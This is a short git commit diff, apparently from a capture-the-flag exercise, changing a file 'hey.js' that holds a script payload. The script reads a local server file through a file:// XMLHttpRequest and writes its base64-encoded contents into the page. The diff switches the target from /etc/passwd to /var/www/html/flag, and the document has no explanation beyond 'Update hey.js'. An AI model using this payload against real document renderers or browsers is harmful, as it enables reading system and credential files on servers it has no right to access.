096424e66226d2126abd39201b7e5ec8315d1b4a
MVinogradof <56521578+MVinogradof@users.noreply.github.com>
2022-06-27 12:48:35 +0300

    Update hey.js

--- hey.js
+++ hey.js
@@ -1,5 +1,5 @@
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","file:///etc/passwd");x.send();
+x.open("GET","file:///var/www/html/flag");x.send();
 </script>
